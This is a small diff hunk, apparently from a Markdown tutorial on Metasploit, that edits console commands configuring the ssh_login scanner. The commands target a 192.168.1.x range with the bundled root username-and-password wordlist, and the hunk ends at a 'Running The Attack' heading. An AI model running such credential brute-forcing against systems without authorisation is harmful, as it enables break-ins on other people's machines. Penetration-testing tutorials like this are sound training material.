@@ -115,8 +115,8 @@ rhosts => 192.168.1.0-255
 msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
-msf auxiliary(ssh_login) > set VERBOSE false
-VERBOSE => false
+msf5 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
+THREADS => 10
 ```
 
 ### Running The Attack
